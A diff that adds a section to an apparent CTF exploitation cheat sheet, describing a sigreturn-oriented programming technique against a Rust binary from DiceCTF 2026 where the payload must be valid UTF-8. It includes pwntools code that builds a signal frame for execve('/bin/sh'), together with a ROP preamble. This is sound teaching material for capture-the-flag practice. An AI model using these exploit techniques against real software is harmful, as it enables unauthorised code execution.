@@ -143,6 +143,44 @@ flag = p.recv(timeout=3)
 # by earlier read() calls. Use explicit sendline() after delays instead.
 ```
 
+## SROP with UTF-8 Payload Constraints (DiceCTF 2026)
+
+**Pattern (Message Store):** Rust binary where OOB color index reads memcpy from GOT, causing `memcpy(stack, BUFFER, 0x1000)` — a massive stack overflow. But `from_utf8_lossy()` validates the buffer first: any invalid UTF-8 triggers `Cow::Owned` with corrupted replacement data. **The entire 0x1000-byte payload must be valid UTF-8.**
+
+**Why SROP:** Normal ROP gadget addresses contain bytes >0x7f which are invalid single-byte UTF-8. SROP needs only 3 gadgets (set rax=15, call syscall) to trigger `sigreturn`, then a signal frame sets ALL registers for `execve("/bin/sh", NULL, NULL)`.
+
+**UTF-8 multi-byte spanning trick:** Register fields in the signal frame are 8 bytes each, packed contiguously. A 3-byte UTF-8 sequence can start in one field and end in the next:
+
+```python
+from pwn import *
+
+# r15 is the field immediately before rdi in the sigframe
+# rdi = pointer to "/bin/sh" = 0x2f9fb0 → bytes [B0, 9F, 2F, ...]
+# B0, 9F are UTF-8 continuation bytes (10xxxxxx) — invalid as sequence start
+# Solution: set r15's last byte to 0xE0 (3-byte UTF-8 leader)
+# E0 B0 9F = valid UTF-8 (U+0C1F) spanning r15→rdi boundary
+
+frame = SigreturnFrame()
+frame.rax = 59          # execve
+frame.rdi = buf_addr + 0x178  # address of "/bin/sh\0"
+frame.rsi = 0
+frame.rdx = 0
+frame.rip = syscall_addr
+frame.r15 = 0xE000000000000000  # Last byte 0xE0 starts 3-byte UTF-8 seq
+
+# ROP preamble: 3 UTF-8-safe gadgets
+payload = b'\x00' * 0x48           # padding to return address
+payload += p64(pop_rax_ret)        # set rax = 15 (sigreturn)
+payload += p64(15)
+payload += p64(syscall_ret)        # trigger sigreturn
+payload += bytes(frame)
+# Place "/bin/sh\0" at offset 0x178 in BUFFER
+```
+
+**When to use:** Any exploit where payload bytes pass through UTF-8 validation (Rust `String`, `from_utf8`, JSON parsers). SROP minimizes the number of gadget addresses that must be UTF-8-safe.
+
+**Key insight:** Multi-byte UTF-8 sequences (2-4 bytes) can span adjacent fields in structured data (signal frames, ROP chains). Set the leader byte (0xC0-0xF7) as the last byte of one field so continuation bytes (0x80-0xBF) in the next field form a valid sequence.
+
 ## Seccomp Bypass
 
 Alternative syscalls when seccomp blocks `open()`/`read()`:
